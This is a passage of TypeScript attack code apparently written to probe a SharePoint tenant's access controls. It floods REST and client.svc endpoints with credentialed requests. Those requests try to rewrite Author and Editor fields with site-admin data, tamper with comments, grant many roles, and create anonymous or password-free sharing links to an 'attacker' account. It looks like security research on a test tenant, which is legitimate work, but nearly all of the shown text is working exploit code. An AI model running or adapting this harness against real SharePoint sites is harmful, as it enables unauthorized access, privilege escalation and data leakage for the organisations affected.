          AppInstanceId: "00000000-0000-0000-0000-000000000000",
          ClassicWelcomePage: null,
          Configuration: 0,
          Created: "2024-12-23T12:53:13.77",
          CurrentChangeToken: {
            StringValue:
              "1;2;27341d3a-24dc-48fc-ae4e-0a439cf859fd;638750541870370000;1010560322",
          },
          CustomMasterUrl: "/_catalogs/masterpage/seattle.master",
          Description: "",
          DesignPackageId: "00000000-0000-0000-0000-000000000000",
          DocumentLibraryCalloutOfficeWebAppPreviewersDisabled: false,
          EnableMinimalDownload: false,
          FooterColorIndexInDarkMode: 0,
          FooterColorIndexInLightMode: 0,
          FooterEmphasis: 0,
          FooterEnabled: true,
          FooterLayout: 0,
          HeaderColorIndexInDarkMode: 0,
          HeaderColorIndexInLightMode: 0,
          HeaderEmphasis: 0,
          HeaderLayout: 0,
          HideTitleInHeader: false,
          HorizontalQuickLaunch: false,
          Id: "27341d3a-24dc-48fc-ae4e-0a439cf859fd",
          IsEduClass: false,
          IsEduClassProvisionChecked: false,
          IsEduClassProvisionPending: false,
          IsHomepageModernized: false,
          IsMultilingual: true,
          IsRevertHomepageLinkHidden: false,
          Language: 1033,
          LastItemModifiedDate: "2025-02-13T14:35:49Z",
          LastItemUserModifiedDate: "2025-02-13T14:31:02Z",
          LogoAlignment: 0,
          MasterUrl: "/_catalogs/masterpage/seattle.master",
          MegaMenuEnabled: true,
          NavAudienceTargetingEnabled: false,
          NoCrawl: false,
          ObjectCacheEnabled: false,
          OverwriteTranslationsOnChange: false,
          ResourcePath: { DecodedUrl: "https://tmsobb2.sharepoint.com" },
          QuickLaunchEnabled: true,
          RecycleBinEnabled: true,
          SearchScope: 0,
          ServerRelativeUrl: "/",
          SiteLogoUrl: null,
          SyndicationEnabled: true,
          TenantAdminMembersCanShare: 0,
          Title: "Communication site",
          TreeViewEnabled: false,
          UIVersion: 15,
          UIVersionConfigurationEnabled: false,
          Url: "https://tmsobb2.sharepoint.com",
          WebTemplate: "SITEPAGEPUBLISHING",
          WelcomePage: "SitePages/test.aspx",
        })
      );
    });
    this.sendRequest2(
      "POST",
      `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Author`
    );
    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Author`,
        JSON.stringify({
          Title: "K Testt",
          PrincipalType: 1,
          Email: "attacker@tmsobb2.onmicrosoft.com",
          Expiration: "",
          IsEmailAuthenticationGuestUser: false,
          IsShareByEmailGuestUser: false,
          IsSiteAdmin: false,
        })
      );
    });

    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Author`,
        JSON.stringify({
          Id: 11,
          ServerRedirectedEmbedUri: null,
          ServerRedirectedEmbedUrl: "",
          ContentTypeId: "0x010A00A37404FF361E30429BA657CF50DB1989",
          Title: "TMSOBB",
          OData__ColorTag: null,
          ComplianceAssetId: null,
          Name: "i:0#.f|membership|tmsobb@tmsobb2.onmicrosoft.com",
          EMail: "tmsobb@tmsobb2.onmicrosoft.com",
          OtherMail: null,
          UserExpiration: null,
          UserLastDeletionTime: null,
          MobilePhone: null,
          Notes: null,
          SipAddress: "tmsobb@tmsobb2.onmicrosoft.com",
          IsSiteAdmin: true,
          Deleted: false,
          UserInfoHidden: false,
          Picture: {
            Description:
              "https://tmsobb-my.sharepoint.com:443/User%20Photos/Profile%20Pictures/a188d0ef-798b-40f7-b98d-0b300a6d7da3_MThumb.jpg",
            Url: "https://tmsobb-my.sharepoint.com:443/User%20Photos/Profile%20Pictures/a188d0ef-798b-40f7-b98d-0b300a6d7da3_MThumb.jpg",
          },
          Department: null,
          JobTitle: null,
          FirstName: "TMSOBB",
          LastName: "Testt",
          WorkPhone: "9075197067",
          UserName: "tmsobb@tmsobb2.onmicrosoft.com",
          WebSite: null,
          SPSResponsibility: null,
          Office: null,
          SPSPictureTimestamp: "63870559229",
          SPSPicturePlaceholderState: 1,
          SPSPictureExchangeSyncState: null,
          SPSUserType: 0,
          ID: 11,
          Modified: "2024-12-24T12:02:18Z",
          Created: "2024-12-23T12:55:38Z",
          AuthorId: 11,
          EditorId: 11,
          OData__UIVersionString: "1.0",
          Attachments: false,
          GUID: "6a7e2b80-b18d-4bc1-a42c-4fd57c51dcbd",
        })
      );
    });
    this.sendRequest2(
      "POST",
      `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Editor`
    );
    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Editor`,
        JSON.stringify({
          Id: 11,
          ServerRedirectedEmbedUri: null,
          ServerRedirectedEmbedUrl: "",
          ContentTypeId: "0x010A00A37404FF361E30429BA657CF50DB1989",
          Title: "TMSOBB",
          OData__ColorTag: null,
          ComplianceAssetId: null,
          Name: "i:0#.f|membership|tmsobb@tmsobb2.onmicrosoft.com",
          EMail: "tmsobb@tmsobb2.onmicrosoft.com",
          OtherMail: null,
          UserExpiration: null,
          UserLastDeletionTime: null,
          MobilePhone: null,
          Notes: null,
          SipAddress: "tmsobb@tmsobb2.onmicrosoft.com",
          IsSiteAdmin: true,
          Deleted: false,
          UserInfoHidden: false,
          Picture: {
            Description:
              "https://tmsobb-my.sharepoint.com:443/User%20Photos/Profile%20Pictures/a188d0ef-798b-40f7-b98d-0b300a6d7da3_MThumb.jpg",
            Url: "https://tmsobb-my.sharepoint.com:443/User%20Photos/Profile%20Pictures/a188d0ef-798b-40f7-b98d-0b300a6d7da3_MThumb.jpg",
          },
          Department: null,
          JobTitle: null,
          FirstName: "TMSOBB",
          LastName: "Testt",
          WorkPhone: "9075197067",
          UserName: "tmsobb@tmsobb2.onmicrosoft.com",
          WebSite: null,
          SPSResponsibility: null,
          Office: null,
          SPSPictureTimestamp: "63870559229",
          SPSPicturePlaceholderState: 1,
          SPSPictureExchangeSyncState: null,
          SPSUserType: 0,
          ID: 11,
          Modified: "2024-12-24T12:02:18Z",
          Created: "2024-12-23T12:55:38Z",
          AuthorId: 11,
          EditorId: 11,
          OData__UIVersionString: "1.0",
          Attachments: false,
          GUID: "6a7e2b80-b18d-4bc1-a42c-4fd57c51dcbd",
        })
      );
    });
  };

  itemUpdateXMLCalls = () => {
    //Add
    var xhr = new XMLHttpRequest();
    xhr.open(
      "POST",
      "https://tmsobb2.sharepoint.com/_vti_bin/client.svc/ProcessQuery",
      true
    );
    xhr.setRequestHeader("accept", "*/*");
    xhr.setRequestHeader("content-type", "text/xml");
    xhr.setRequestHeader(
      "accept-language",
      "en-GB,en-US;q=0.9,en;q=0.8,mr;q=0.7"
    );
    xhr.setRequestHeader(
      "X-RequestDigest",
      localStorage.getItem("reqd") ?? "*"
    );

    xhr.withCredentials = true;
    var body = `\x3cRequest xmlns=\"http://schemas.microsoft.com/sharepoint/clientquery/2009\" SchemaVersion=\"15.0.0.0\" LibraryVersion=\"16.0.0.0\" ApplicationName=\"Javascript Library\"\x3e\x3cActions\x3e\x3cObjectPath Id=\"1\" ObjectPathId=\"0\" /\x3e\x3cObjectPath Id=\"3\" ObjectPathId=\"2\" /\x3e\x3cObjectPath Id=\"5\" ObjectPathId=\"4\" /\x3e\x3cObjectPath Id=\"7\" ObjectPathId=\"6\" /\x3e\x3cObjectPath Id=\"9\" ObjectPathId=\"8\" /\x3e\x3cObjectPath Id=\"11\" ObjectPathId=\"10\" /\x3e\x3cObjectPath Id=\"13\" ObjectPathId=\"12\" /\x3e\x3cMethod Name=\"SetFieldValue\" Id=\"14\" ObjectPathId=\"12\"\x3e\x3cParameters\x3e\x3cParameter Type=\"String\"\x3eTitle\x3c/Parameter\x3e\x3cParameter Type=\"String\"\x3ekkkkkkkkkkkkkkkkkkkkkkk\x3c/Parameter\x3e\x3c/Parameters\x3e\x3c/Method\x3e\x3cMethod Name=\"Update\" Id=\"15\" ObjectPathId=\"12\" /\x3e\x3cQuery Id=\"16\" ObjectPathId=\"12\"\x3e\x3cQuery SelectAllProperties=\"false\"\x3e\x3cProperties\x3e\x3cProperty Name=\"FileSystemObjectType\" ScalarProperty=\"true\" /\x3e\x3cProperty Name=\"Id\" ScalarProperty=\"true\" /\x3e\x3cProperty Name=\"Title\" ScalarProperty=\"true\" /\x3e\x3c/Properties\x3e\x3c/Query\x3e\x3c/Query\x3e\x3cObjectPath Id=\"18\" ObjectPathId=\"17\" /\x3e\x3cQuery Id=\"19\" ObjectPathId=\"17\"\x3e\x3cQuery SelectAllProperties=\"true\"\x3e\x3cProperties /\x3e\x3c/Query\x3e\x3c/Query\x3e\x3cQuery Id=\"20\" ObjectPathId=\"12\"\x3e\x3cQuery SelectAllProperties=\"true\"\x3e\x3cProperties\x3e\x3cProperty Name=\"FileSystemObjectType\" ScalarProperty=\"true\" /\x3e\x3cProperty Name=\"Id\" ScalarProperty=\"true\" /\x3e\x3cProperty Name=\"Title\" ScalarProperty=\"true\" /\x3e\x3c/Properties\x3e\x3c/Query\x3e\x3c/Query\x3e\x3cObjectPath Id=\"22\" ObjectPathId=\"21\" /\x3e\x3cQuery Id=\"23\" ObjectPathId=\"21\"\x3e\x3cQuery SelectAllProperties=\"true\"\x3e\x3cProperties /\x3e\x3c/Query\x3e\x3c/Query\x3e\x3c/Actions\x3e\x3cObjectPaths\x3e\x3cStaticProperty Id=\"0\" TypeId=\"{3747adcd-a3c3-41b9-bfab-4a64dd2f1e0a}\" Name=\"Current\" /\x3e\x3cProperty Id=\"2\" ParentId=\"0\" Name=\"Web\" /\x3e\x3cProperty Id=\"4\" ParentId=\"2\" Name=\"Lists\" /\x3e\x3cMethod Id=\"6\" ParentId=\"4\" Name=\"GetById\"\x3e\x3cParameters\x3e\x3cParameter Type=\"String\"\x3e{${lid}}\x3c/Parameter\x3e\x3c/Parameters\x3e\x3c/Method\x3e\x3cProperty Id=\"8\" ParentId=\"6\" Name=\"Views\" /\x3e\x3cMethod Id=\"10\" ParentId=\"8\" Name=\"GetById\"\x3e\x3cParameters\x3e\x3cParameter Type=\"String\"\x3e{3CBA6B32-3C46-428B-B00F-BC6F22AE1FD9}\x3c/Parameter\x3e\x3c/Parameters\x3e\x3c/Method\x3e\x3cMethod Id=\"12\" ParentId=\"6\" Name=\"AddItem\"\x3e\x3cParameters\x3e\x3cParameter TypeId=\"{54cdbee5-0897-44ac-829f-411557fa11be}\"\x3e\x3cProperty Name=\"FolderUrl\" Type=\"String\"\x3e\x3c/Property\x3e\x3cProperty Name=\"LeafName\" Type=\"Null\" /\x3e\x3cProperty Name=\"UnderlyingObjectType\" Type=\"Number\"\x3e0\x3c/Property\x3e\x3c/Parameter\x3e\x3c/Parameters\x3e\x3c/Method\x3e\x3cProperty Id=\"17\" ParentId=\"12\" Name=\"FieldValuesAsText\" /\x3e\x3cProperty Id=\"21\" ParentId=\"12\" Name=\"ContentType\" /\x3e\x3c/ObjectPaths\x3e\x3c/Request\x3e`;
    var aBody = new Uint8Array(body.length);
    for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
    xhr.send(new Blob([aBody]));

    //Update
    var xhr = new XMLHttpRequest();
    xhr.open(
      "POST",
      "https://tmsobb2.sharepoint.com/_vti_bin/client.svc/ProcessQuery",
      true
    );
    xhr.setRequestHeader("content-type", "text/xml");
    xhr.setRequestHeader("accept", "*/*");
    xhr.setRequestHeader(
      "accept-language",
      "en-GB,en-US;q=0.9,en;q=0.8,mr;q=0.7"
    );
    xhr.withCredentials = true;
    var body = `\x3cRequest xmlns=\"http://schemas.microsoft.com/sharepoint/clientquery/2009\" SchemaVersion=\"15.0.0.0\" LibraryVersion=\"16.0.0.0\" ApplicationName=\"Javascript Library\"\x3e\x3cActions\x3e\x3cObjectPath Id=\"1\" ObjectPathId=\"0\" /\x3e\x3cObjectPath Id=\"3\" ObjectPathId=\"2\" /\x3e\x3cObjectPath Id=\"5\" ObjectPathId=\"4\" /\x3e\x3cObjectPath Id=\"7\" ObjectPathId=\"6\" /\x3e\x3cObjectPath Id=\"9\" ObjectPathId=\"8\" /\x3e\x3cObjectPath Id=\"11\" ObjectPathId=\"10\" /\x3e\x3cExceptionHandlingScopeSimple Id=\"12\"\x3e\x3cObjectPath Id=\"15\" ObjectPathId=\"14\" /\x3e\x3cMethod Name=\"SetFieldValue\" Id=\"16\" ObjectPathId=\"14\"\x3e\x3cParameters\x3e\x3cParameter Type=\"String\"\x3eTitle\x3c/Parameter\x3e\x3cParameter Type=\"String\"\x3eEdittttttt\x3c/Parameter\x3e\x3c/Parameters\x3e\x3c/Method\x3e\x3cMethod Name=\"Update\" Id=\"17\" ObjectPathId=\"14\" /\x3e\x3cQuery Id=\"18\" ObjectPathId=\"14\"\x3e\x3cQuery SelectAllProperties=\"false\"\x3e\x3cProperties\x3e\x3cProperty Name=\"Title\" ScalarProperty=\"true\" /\x3e\x3c/Properties\x3e\x3c/Query\x3e\x3c/Query\x3e\x3cObjectPath Id=\"20\" ObjectPathId=\"19\" /\x3e\x3cQuery Id=\"21\" ObjectPathId=\"19\"\x3e\x3cQuery SelectAllProperties=\"true\"\x3e\x3cProperties /\x3e\x3c/Query\x3e\x3c/Query\x3e\x3cQuery Id=\"22\" ObjectPathId=\"14\"\x3e\x3cQuery SelectAllProperties=\"true\"\x3e\x3cProperties\x3e\x3cProperty Name=\"Title\" ScalarProperty=\"true\" /\x3e\x3c/Properties\x3e\x3c/Query\x3e\x3c/Query\x3e\x3c/ExceptionHandlingScopeSimple\x3e\x3cMethod Name=\"RenderListData\" Id=\"24\" ObjectPathId=\"6\"\x3e\x3cParameters\x3e\x3cParameter Type=\"String\"\x3e&lt;View Scope=\"RecursiveAll\"&gt;&lt;ViewFields&gt;&lt;FieldRef Name=\"ID\"/&gt;&lt;FieldRef Name=\"DocIcon\"/&gt;&lt;FieldRef Name=\"LinkTitle\"/&gt;&lt;FieldRef Name=\"Num\"/&gt;&lt;FieldRef Name=\"ID\"/&gt;&lt;FieldRef Name=\"Modified\"/&gt;&lt;FieldRef Name=\"ApprovedFunds\"/&gt;&lt;/ViewFields&gt;&lt;Query&gt;&lt;OrderBy&gt;&lt;FieldRef Name=\"ID\"/&gt;&lt;/OrderBy&gt;&lt;Where&gt;&lt;Eq&gt;&lt;FieldRef Name=\"ID\" /&gt;&lt;Value Type=\"Number\"&gt;2&lt;/Value&gt;&lt;/Eq&gt;&lt;/Where&gt;&lt;/Query&gt;&lt;/View&gt;\x3c/Parameter\x3e\x3c/Parameters\x3e\x3c/Method\x3e\x3c/Actions\x3e\x3cObjectPaths\x3e\x3cStaticProperty Id=\"0\" TypeId=\"{3747adcd-a3c3-41b9-bfab-4a64dd2f1e0a}\" Name=\"Current\" /\x3e\x3cProperty Id=\"2\" ParentId=\"0\" Name=\"Web\" /\x3e\x3cProperty Id=\"4\" ParentId=\"2\" Name=\"Lists\" /\x3e\x3cMethod Id=\"6\" ParentId=\"4\" Name=\"GetById\"\x3e\x3cParameters\x3e\x3cParameter Type=\"String\"\x3e{${lid}}\x3c/Parameter\x3e\x3c/Parameters\x3e\x3c/Method\x3e\x3cProperty Id=\"8\" ParentId=\"6\" Name=\"Views\" /\x3e\x3cMethod Id=\"10\" ParentId=\"8\" Name=\"GetById\"\x3e\x3cParameters\x3e\x3cParameter Type=\"String\"\x3e{3CBA6B32-3C46-428B-B00F-BC6F22AE1FD9}\x3c/Parameter\x3e\x3c/Parameters\x3e\x3c/Method\x3e\x3cMethod Id=\"14\" ParentId=\"6\" Name=\"GetItemByStringId\"\x3e\x3cParameters\x3e\x3cParameter Type=\"String\"\x3e${itemId}\x3c/Parameter\x3e\x3c/Parameters\x3e\x3c/Method\x3e\x3cProperty Id=\"19\" ParentId=\"14\" Name=\"FieldValuesAsText\" /\x3e\x3c/ObjectPaths\x3e\x3c/Request\x3e`;
    var aBody = new Uint8Array(body.length);
    for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
    xhr.send(new Blob([aBody]));
  };

  addCommentWithMention = () => {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open(
        "POST",
        `https:\/\/tmsobb2.sharepoint.com\/_api\/web\/lists\/getByTitle('${listName}')\/items(${itemId})\/comments`,
        true
      );
      xhr.setRequestHeader("content-type", "application/json;charset=utf-8");
      xhr.setRequestHeader("accept", "application/json");
      xhr.setRequestHeader(
        "accept-language",
        "en-GB,en-US;q=0.9,en;q=0.8,mr;q=0.7"
      );
      xhr.setRequestHeader(
        "X-RequestDigest",
        localStorage.getItem("reqd") ?? "*"
      );
      xhr.withCredentials = true;
      var body = JSON.stringify(
        createMentionData(
          SHAREPOINT_CONSTANTS.USERS.ATTACKER_EMAIL,
          SHAREPOINT_CONSTANTS.USERS.TMSOBB_NAME
        )
      );
      var aBody = new Uint8Array(body.length);
      for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
      xhr.send(new Blob([aBody]));
    } catch (first) {
      console.log(first);
    }
  };
  addComment = async (): Promise<any> => {
    return new Promise(async (resolve, reject) => {
      try {
        const response = await webObj.lists
          .getById(lid)
          .items.getById(itemId)
          .comments.add(SHAREPOINT_CONSTANTS.COMMENTS.ANONYMOUS_COMMENT);

        // Log the response
        console.log("Comment added successfully:", response.select("Id"));

        // Resolve the promise with the response
        resolve(response);
      } catch (error) {
        // Log and reject with the error
        console.error("Error adding comment:", error);
        reject(error);
      }
    });
  };
  deleteComment = (no: number) => {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open(
        "POST",
        `https:\/\/tmsobb2.sharepoint.com\/_api\/web\/lists\/getByTitle('${listName}')\/items(${itemId})\/comments(${no})`,
        true
      );
      xhr.setRequestHeader("content-type", "application/json;charset=utf-8");
      xhr.setRequestHeader("accept", "application/json");
      xhr.setRequestHeader(
        "accept-language",
        "en-GB,en-US;q=0.9,en;q=0.8,mr;q=0.7"
      );
      xhr.withCredentials = true;
      var body = "";
      var aBody = new Uint8Array(body.length);
      for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
      xhr.send(new Blob([aBody]));
    } catch (first) {
      console.log(first);
    }
  };
  patchComment = (cid: any) => {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open(
        "PATCH",
        `${SHAREPOINT_CONSTANTS.API_BASE_URL}/web/lists(@a1)/GetItemById(@a2)/Comments(@a3)?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27&@a3=%27${cid}%27`,
        true
      );
      xhr.setRequestHeader("content-type", "application/json;charset=UTF-8");
      xhr.setRequestHeader("accept", "application/json;odata=verbose");
      xhr.setRequestHeader(
        "accept-language",
        "en-GB,en-US;q=0.9,en;q=0.8,mr;q=0.7"
      );
      xhr.setRequestHeader(
        "X-RequestDigest",
        localStorage.getItem("reqd") ?? "*"
      );
      xhr.withCredentials = true;
      var body = JSON.stringify({
        text: SHAREPOINT_CONSTANTS.COMMENTS.ATTACKER_COMMENT,
        mentions: [],
      });
      var aBody = new Uint8Array(body.length);
      for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
      xhr.send(new Blob([aBody]));

      this.sendRequest(
        "PATCH",
        `${SHAREPOINT_CONSTANTS.API_BASE_URL}/web/lists(@a1)/GetItemById(@a2)/Comments(@a3)?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27&@a3=%271%27`,
        JSON.stringify({ text: SHAREPOINT_CONSTANTS.COMMENTS.AAAA_COMMENT })
      );
      this.sendRequest(
        "MERGE",
        `${SHAREPOINT_CONSTANTS.API_BASE_URL}/web/lists(@a1)/GetItemById(@a2)/Comments(@a3)?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27&@a3=%272%27`,
        JSON.stringify({ text: SHAREPOINT_CONSTANTS.COMMENTS.AAAA_COMMENT })
      );
      this.sendRequest(
        "MERGE",
        `${SHAREPOINT_CONSTANTS.API_BASE_URL}/web/lists(@a1)/GetItemById(@a2)/Comments(@a3)?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27&@a3=%271%27`,
        JSON.stringify({ text: SHAREPOINT_CONSTANTS.COMMENTS.AAAA_COMMENT })
      );
      this.sendRequest(
        "PATCH",
        `${SHAREPOINT_CONSTANTS.API_BASE_URL}/web/lists(@a1)/GetItemById(@a2)/Comments(@a3)?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27&@a3=%271%27`,
        JSON.stringify({ text: SHAREPOINT_CONSTANTS.COMMENTS.AAAA_COMMENT })
      );
      this.sendRequest(
        "DELETE",
        `${SHAREPOINT_CONSTANTS.API_BASE_URL}/web/lists(@a1)/GetItemById(@a2)/Comments(@a3)?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27&@a3=%271%27`
      );
    } catch (first) {
      console.log(first);
    }
  };
  Share_List2 = async () => {
    try {

      const roles = [
        1073741827, 1073741828, 1073741831, 1073741832, 1073741830, 1073741829,
      ];
      principleIds.forEach(async (principleId) => {
        roles.forEach(async (role) => {
          await webObj.lists
            .getById(lid)
            .roleAssignments.add(principleId, role)
            .catch((first) => console.log(first));
        });
      });
      this.ShareListsubmitRequest();
      webObj
        .shareObject(
          `${SHAREPOINT_CONSTANTS.BASE_URL}/Lists/${listName}`,
          SHAREPOINT_CONSTANTS.USERS.ATTACKER_LOGIN_NAME,
          1,
          {
            subject: SHAREPOINT_CONSTANTS.EMAIL.SHARING_SUBJECT_2,
            body: SHAREPOINT_CONSTANTS.EMAIL.SHARING_BODY,
          },
          1,
          true,
          true,
          true
        )
        .catch((first) => console.log(first));
      webObj
        .unshareObject(`${SHAREPOINT_CONSTANTS.BASE_URL}/Lists/${listName}`)
        .catch((first) => console.log(first));
      webObj
        .shareObject(
          `${SHAREPOINT_CONSTANTS.BASE_URL}/Lists/${listName}`,
          SHAREPOINT_CONSTANTS.USERS.ATTACKER_LOGIN_NAME,
          1,
          {
            subject: SHAREPOINT_CONSTANTS.EMAIL.SHARING_SUBJECT_2,
            body: SHAREPOINT_CONSTANTS.EMAIL.SHARING_BODY,
          },
          1,
          true,
          false,
          true
        )
        .catch((first) => console.log(first));
      webObj
        .shareObjectRaw({
          url: `${SHAREPOINT_CONSTANTS.BASE_URL}/${listName}/${listName}`, // The URL of the item to be shared
          peoplePickerInput: JSON.stringify([
            { Key: SHAREPOINT_CONSTANTS.USERS.ATTACKER_LOGIN_NAME }, // User/recipient information
          ]),
          roleValue: "role:1073741826", // Corrected role value for "Edit" permission
          groupId: 0, // Group ID (0 means no group is specified)
          propagateAcl: false, // Whether to propagate the access control list
          sendEmail: true, // Whether to send an email to recipients
          includeAnonymousLinkInEmail: false, // Whether to include an anonymous link in the email
          emailSubject: SHAREPOINT_CONSTANTS.EMAIL.SHARING_INVITATION_SUBJECT, // Subject of the email
          emailBody: SHAREPOINT_CONSTANTS.EMAIL.SHARING_INVITATION_BODY, // Body of the email
          useSimplifiedRoles: true, // Use simplified roles such as 'view' or 'edit'
        })
        .then((response) => {
          console.log("Sharing link updated successfully:", response);
        })
        .catch((error) => {
          console.error("Error updating sharing link:", error);
        });
    } catch (first) {
      console.log(first);
    }
  };
  Share_List = async () => {
    const payloadConfigs = [
      {
        allowAnonymousAccess: true,
        restrictShareMembership: false,
        password: "",
        expiration: null,
      },
      {
        allowAnonymousAccess: false,
        restrictShareMembership: false,
        password: "",
        expiration: null,
      },
      {
        allowAnonymousAccess: true,
        restrictShareMembership: true,
        password: "",
        expiration: null,
      },
      {
        allowAnonymousAccess: false,
        restrictShareMembership: true,
        password: "",
        expiration: null,
      },
      {
        allowAnonymousAccess: true,
        restrictShareMembership: false,
        password: "Test@1234",
        expiration: null,
      },
      {
        allowAnonymousAccess: true,
        restrictShareMembership: false,
        password: "",
        expiration: "20501220T000000+0530",
      },
    ];

    for (const role of roles2) {
      for (const kid of kinds) {
        for (const sid of scope) {
          for (const config of payloadConfigs) {
            const payload = {
              request: {
                createLink: true,
                settings: {
                  allowAnonymousAccess: config.allowAnonymousAccess,
                  trackLinkUsers: false,
                  linkKind: kid,
                  expiration: config.expiration,
                  role: role,
                  restrictShareMembership: config.restrictShareMembership,
                  updatePassword: false,
                  password: config.password,
                  scope: sid,
                  nav: "",
                },
              },
            };
            await this.sendRequest(
              "POST",
              `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/ShareLink?@a1=%27${lid}%27`,
              JSON.stringify(payload)
            );
            await this.delay(50);
          }
        }
      }
    }

    this.Share_List2();
  };
  Share_List_WithUsers = async () => {
    for (const pid of personGroup) {
      for (const rid of roles2) {
        for (const kid of kinds) {
          for (const sid of scope) {
            const payload = {
              request: {
                createLink: true,
                settings: {
                  allowAnonymousAccess: true,
                  trackLinkUsers: false,
                  linkKind: kid,
                  expiration: "20501220T000000+0530",
                  role: rid,
                  restrictShareMembership: false,
                  updatePassword: false,
                  password: "",
                  scope: sid,
                  nav: "",
                },
                peoplePickerInput: `[{"Key":"${pid}"}]`,
              },
            };
            await this.sendRequest(
              "POST",
              `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/ShareLink?@a1=%27${lid}%27`,
              JSON.stringify(payload)
            );
            await delay(50);
            payload.request.settings.allowAnonymousAccess = false;
            await this.sendRequest(
              "POST",
              `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/ShareLink?@a1=%27${lid}%27`,
              JSON.stringify(payload)
            );
          }
        }
      }
    }
  };
  ShareListsubmitRequest = () => {
    const kinds = [27, 28, 29, 32, 31, 30];
    kinds.forEach((kind) => {
      var xhr = new XMLHttpRequest();
      xhr.open(
        "POST",
        `https:\/\/tmsobb2.sharepoint.com\/_api\/web\/Lists(@a1)\/ShareObject?@a1=%27${lid}%27`,
        true
      );
      xhr.setRequestHeader("content-type", "application/json;odata=verbose");
      xhr.setRequestHeader(
        "accept-language",
        "en-GB,en-US;q=0.9,en;q=0.8,mr;q=0.7"
      );
      xhr.setRequestHeader("accept", "application/json;odata=verbose");
      xhr.setRequestHeader(
        "X-RequestDigest",
        localStorage.getItem("reqd") ?? "*"
      );
      xhr.withCredentials = true;
      var body = `{\"peoplePickerInput\":\"[{\\\"Key\\\":\\\"attacker@tmsobb2.onmicrosoft.com\\\",\\\"IsResolved\\\":false,\\\"EntityData\\\":{\\\"ObjectId\\\":\\\"e4d5e997-9b18-4527-887e-5484d8d19ba3\\\"},\\\"PeopleType\\\":\\\"Person\\\",\\\"PeopleSubtype\\\":\\\"OrganizationUser\\\"}]\",\"roleValue\":\"role:10737418${kind}\",\"sendEmail\":true,\"emailBody\":\"\",\"includeAnonymousLinkInEmail\":false,\"propagateAcl\":true,\"useSimplifiedRoles\":true}`;
      var aBody = new Uint8Array(body.length);
      for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
      xhr.send(new Blob([aBody]));
    });
  };
  list_role = () => {
    personGroup.forEach(async (personG) => {
      roles.forEach(async (role) => {
        var xhr = new XMLHttpRequest();
        xhr.open(
          "POST",
          `https:\/\/tmsobb2.sharepoint.com\/_api\/web\/Lists(@a1)\/UpdateDocumentSharingInfo?@a1=%27${lid}%27`,
          true
        );
        xhr.setRequestHeader("content-type", "application/json;odata=verbose");
        xhr.setRequestHeader("accept", "application/json;odata=verbose");
        xhr.setRequestHeader(
          "accept-language",
          "en-GB,en-US;q=0.9,en;q=0.8,mr;q=0.7"
        );
        xhr.setRequestHeader(
          "X-RequestDigest",
          localStorage.getItem("reqd") ?? "*"
        );
        xhr.withCredentials = true;
        var body = `{\"userRoleAssignments\":[{\"UserId\":\"${personG}\",\"Role\":${role}}],\"validateExistingPermissions\":false,\"additiveMode\":false,\"sendServerManagedNotification\":false,\"customMessage\":null,\"includeAnonymousLinksInNotification\":false,\"propagateAcl\":true}`;
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      });
    });
    personGroup.forEach(async (personG) => {
      roles.forEach(async (role) => {
        var xhr = new XMLHttpRequest();
        xhr.open(
          "POST",
          `https:\/\/tmsobb2.sharepoint.com\/_api\/web\/Lists(@a1)\/UpdateDocumentSharingInfo?@a1=%27${lid}%27`,
          true
        );
        xhr.setRequestHeader("content-type", "application/json;odata=verbose");
        xhr.setRequestHeader("accept", "application/json;odata=verbose");
        xhr.setRequestHeader(
          "accept-language",
          "en-GB,en-US;q=0.9,en;q=0.8,mr;q=0.7"
        );
        xhr.setRequestHeader(
          "X-RequestDigest",
          localStorage.getItem("reqd") ?? "*"
        );
        xhr.withCredentials = true;
        var body = `{\"userRoleAssignments\":[{\"UserId\":\"${personG}\",\"Role\":${role}}],\"validateExistingPermissions\":false,\"additiveMode\":false,\"sendServerManagedNotification\":false,\"customMessage\":null,\"includeAnonymousLinksInNotification\":true,\"propagateAcl\":true}`;
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      });
    });
  };
  deleteShareListLinks = async () => {
    let res: any = await this.sendRequest(
      "POST",
      `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/GetSharingInformation?@a1=%27${lid}%27&$Expand=permissionsInformation`,
      JSON.stringify({
        request: { maxPrincipalsToReturn: 100, maxLinkMembersToReturn: 100 },
      })
    );
    console.log(JSON.parse(res));
    res = await JSON.parse(res);
    res = await res.d.permissionsInformation.links.results;
    let Lkinds: any = [];
    let shareIds: any = [];
    res.forEach((details: any) => {
      Lkinds.push(details.linkDetails.LinkKind);
      shareIds.push(details.linkDetails.ShareId);
    });
    Lkinds.forEach((kind: any, index: any) => {
      HTTPMethods.forEach((req: any) => {
        this.sendRequest(
          req,
